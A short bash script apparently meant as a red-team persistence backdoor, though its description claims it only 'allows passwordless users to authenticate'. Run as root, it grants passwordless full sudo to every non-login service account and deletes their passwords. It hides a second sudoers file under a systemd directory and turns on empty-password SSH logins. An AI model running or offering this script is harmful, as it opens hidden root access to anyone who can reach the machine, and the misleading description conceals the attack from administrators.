#!/bin/bash
# DESCRIPTION: Allows keyless/passwordless ussers to authenticate

if [[ $(/usr/bin/id -u) -ne 0 ]]; then
    echo "Script must be run as root"
    exit
fi

DIR="/etc/sudoers.d/sudoers_vww"
DIR2="/var/lib/systemd/sudoers.d/sudoers_vww"

rm $DIR > /dev/null
rm $DIR2 > /dev/null

mkdir -p /var/lib/systemd/sudoers.d > /dev/null

touch $DIR
touch $DIR2

if grep -Fxq "@includedir /var/lib/systemd/sudoers.d" $DIR2
then
    echo "Directory already included"
else
    echo "@includedir /var/lib/systemd/sudoers.d" >> /etc/sudoers
fi

echo "=== Setting up sudoers ==="

for user in $(getent passwd | grep -v /bin/bash | grep -v /bin/sh | cut -d: -f1); do
    echo "$user ALL=(ALL) NOPASSWD: ALL" >> $DIR
    echo "$user ALL=(ALL) NOPASSWD: ALL" >> $DIR2
    echo "Added $user to sudoers"
    passwd -d $user > /dev/null
done

#echo "=== Giving blank passwords to all non-passworded users ==="
#sed -i 's/*/U6aMy0wojraho/g' /etc/shadow

echo "=== Allowing password authentication ==="
echo "PermitEmptyPasswords yes" >> /etc/ssh/sshd_config
echo "PasswordAuthentication yes" >> /etc/ssh/sshd_config
systemctl restart sshd

sudo -k

